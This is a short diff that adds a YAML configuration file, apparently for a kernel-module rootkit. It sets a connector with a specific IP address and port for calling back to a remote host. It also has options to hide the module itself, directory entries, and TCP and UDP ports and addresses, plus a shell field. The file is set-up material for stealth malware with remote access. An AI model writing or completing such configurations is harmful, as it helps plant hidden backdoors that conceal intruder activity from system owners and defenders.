@@ -1,0 +1,14 @@
+module:
+    author: "Author"
+    description: "Kernel Module"
+    version: "1.0"
+connector:
+    ip: "77.110.126.70"
+    port: "1338"
+hideme: false
+hide_dent: []
+hide_tcp_port: []
+hide_tcp_ip: []
+hide_udp_port: []
+hide_udp_ip: []
+shell: []
